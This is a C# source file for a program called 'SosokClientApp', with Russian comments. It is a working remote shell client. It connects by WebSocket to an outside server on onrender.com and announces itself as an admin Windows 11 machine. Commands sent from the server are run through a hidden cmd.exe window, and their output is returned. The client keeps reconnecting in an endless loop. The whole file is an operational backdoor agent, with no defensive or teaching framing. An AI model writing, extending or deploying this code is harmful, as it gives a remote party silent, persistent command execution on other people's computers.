// language: C#, file: Program.cs, project: SosokClientApp
using System;
using System.Diagnostics;
using System.Net.WebSockets;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;

namespace SosokClientApp
{
    public class Packet
    {
        public string Type { get; set; } = "";
        public string Action { get; set; } = "";
        public string Payload { get; set; } = "";
        public string ClientId { get; set; } = "";

        public string Serialize() => JsonSerializer.Serialize(this);
        public static Packet? Deserialize(string json) => JsonSerializer.Deserialize<Packet>(json);
    }

    class Program
    {
        static string host = "sosok-server.onrender.com"; // Твой домен
        static string clientId = "TEST-123";

        static async Task Main(string[] args)
        {
            while (true)
            {
                try
                {
                    using var ws = new ClientWebSocket();
                    // Render использует wss (WebSocket Secure) на 443 порту
                    string uri = $"wss://{host}/";
                    Console.WriteLine($"[*] Коннект к {uri}...");

                    await ws.ConnectAsync(new Uri(uri), CancellationToken.None);
                    Console.WriteLine("[+] Подключено!");

                    var info = new Packet { Type = "INFO", ClientId = clientId, Payload = "Admin | Win11" };
                    await SendAsync(ws, info);

                    var buffer = new byte[4096];
                    while (ws.State == WebSocketState.Open)
                    {
                        var result = await ws.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                        if (result.MessageType == WebSocketMessageType.Close) break;

                        string json = Encoding.UTF8.GetString(buffer, 0, result.Count);
                        var packet = Packet.Deserialize(json);

                        if (packet?.Type == "CMD" && packet.Action == "SHELL")
                        {
                            string output = ExecuteShell(packet.Payload);
                            var resp = new Packet { Type = "RESP", Action = "SHELL", Payload = output, ClientId = clientId };
                            await SendAsync(ws, resp);
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[!] Ошибка: {ex.Message}. Переподключение...");
                    await Task.Delay(5000);
                }
            }
        }

        private static async Task SendAsync(ClientWebSocket ws, Packet packet)
        {
            string json = packet.Serialize();
            byte[] data = Encoding.UTF8.GetBytes(json);
            await ws.SendAsync(new ArraySegment<byte>(data), WebSocketMessageType.Text, true, CancellationToken.None);
        }

        private static string ExecuteShell(string command)
        {
            try
            {
                var psi = new ProcessStartInfo("cmd.exe", "/c " + command)
                {
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                using var p = Process.Start(psi);
                return p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
            }
            catch (Exception ex) { return ex.Message; }
        }
    }
}